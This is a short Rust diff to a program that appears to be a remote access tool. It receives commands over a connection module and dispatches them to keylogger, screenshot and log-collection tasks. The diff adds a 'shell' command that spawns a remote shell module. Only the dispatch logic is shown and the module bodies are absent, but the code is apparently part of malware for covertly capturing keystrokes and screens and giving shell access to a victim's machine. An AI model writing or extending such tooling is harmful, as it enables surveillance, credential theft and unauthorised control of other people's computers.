@@ -2,6 +2,7 @@ mod connexion;
 mod input;
 mod logs;
 mod screenshot;
+mod shell;
 use tokio::task::JoinHandle;
 
 #[tokio::main]
@@ -11,7 +12,7 @@ async fn main() {
         Ok(commands) => {
             println!("Commands received: {:?}", commands);
             let mut handles: Vec<JoinHandle<()>> = Vec::new();
-            
+
             for command in commands {
                 match command.as_str() {
                     "keylogger" => {
@@ -43,6 +44,11 @@ async fn main() {
                             println!("Logs terminés");
                         });
                         handles.push(handle);
+                    }
+                    "shell" => {
+                        std::thread::spawn(|| {
+                            shell::launch_shell();
+                        });
                     }
                     _ => println!("Commande inconnue: {}", command),
                 }
